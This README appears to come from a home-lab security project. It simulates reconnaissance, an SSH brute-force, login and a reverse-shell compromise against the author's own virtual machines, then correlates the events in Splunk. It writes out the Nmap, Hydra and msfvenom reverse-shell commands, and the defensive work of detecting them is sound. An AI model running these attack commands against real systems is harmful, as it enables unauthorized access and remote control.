# End-to-End SOC Investigation Simulation

Part of the [`soc-projects`](https://github.com/Mahmoud320-ht/soc-projects) repository.

A full attack-chain simulation combining reconnaissance, SSH brute-force, successful authentication, and a reverse shell compromise — detected and correlated end-to-end in Splunk Cloud, then documented as a structured incident investigation.

## Overview
Reconnaissance (Nmap) → Brute-Force (Hydra) → Successful SSH Login → Reverse Shell (Metasploit)

This project builds on two standalone detections — SSH brute-force detection and reverse shell network detection — and ties them together into a single correlated investigation, the way a SOC analyst reconstructs an incident from multiple data sources rather than treating each alert in isolation.

See [`incident-response.md`](./incident-response.md) for the full investigation writeup, including timeline, evidence, impact assessment, and a transparent note on a timeline discrepancy found during correlation.

## Lab Architecture

| Machine | Role | Purpose |
|---|---|---|
| Kali Linux | Attacker | Executes the full attack chain |
| Ubuntu Server | Victim | Target of all four attack phases |
| Splunk Cloud | SIEM | Correlates evidence across both indexes into one timeline |

All machines were virtual machines running on an isolated network, owned and controlled by the author.

## Tools Used

- **Nmap** — reconnaissance
- **Hydra** — SSH brute-force
- **Metasploit (`msfvenom`, `exploit/multi/handler`)** — reverse shell payload and handler
- **Splunk Cloud** — correlated detection across `ssh_logs` and `network_logs` indexes

## Implementation

### 1. Reconnaissance
```bash
nmap -sV -sC -p 22,80,443 <victim-ip>
```

### 2. Initial Access — Brute-Force
```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://<victim-ip> -t 4
```

### 3. Access Confirmation
```bash
ssh <username>@<victim-ip>
```

### 4. Exploitation — Reverse Shell
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<kali-ip> LPORT=4444 -f elf -o shell.elf
```
Transferred to the victim and executed, connecting back to a Metasploit `multi/handler` listener on Kali.

### 5. Correlated Detection (Splunk)

All three detectable phases — brute-force attempts, successful login, and the reverse shell connection — were pulled from two separate indexes and merged into a single timeline using `eval`/`case`:

```spl
(index=ssh_logs ("Failed password" OR "Accepted password")) OR (index=network_logs "4444")
| eval event_type=case(
    match(_raw, "Failed password"), "1 - Brute-Force Attempt",
    match(_raw, "Accepted password"), "2 - Successful SSH Login",
    match(_raw, "4444"), "3 - Reverse Shell Connection"
  )
| where isnotnull(event_type)
| table _time, event_type, _raw
| sort _time
```

See [`splunk-queries/spl-queries.spl`](./splunk-queries/spl-queries.spl) for the full set, including the timeline chart and phase-summary queries.

### 6. Dashboard
Built a Splunk dashboard, **SOC Investigation - Incident Timeline**, with three panels:
- **Incident Event Log** — full correlated event table
- **Attack Progression Timeline** — line chart of event volume per phase over time
- **Attack Phase Summary** — first/last seen and count per phase

## Skills Demonstrated

- Full attack-chain execution (recon → initial access → exploitation)
- Cross-index event correlation in Splunk (SPL `eval`/`case`, multi-index search)
- Incident timeline reconstruction
- Structured incident reporting (executive summary, evidence, impact, recommendations)
- Data-quality awareness — identifying and transparently reporting a correlation artifact rather than silently smoothing it over

## Disclaimer

This project was conducted entirely within an isolated lab environment using virtual machines owned and controlled by the author, for educational purposes only. No unauthorized systems were accessed or tested.
## Key Finding: Timeline Correlation Limitation

Correlating the two indexes surfaced a real-world lesson: events from separate, earlier lab sessions were still present in both indexes, which skewed the reconstructed timeline out of logical order. This is documented transparently in [`INCIDENT_REPORT.md`](./INCIDENT_REPORT.md) (Section 4) rather than hidden — a core part of SOC work is noticing when correlated data doesn't tell a clean story and saying so.

## Repository Contents
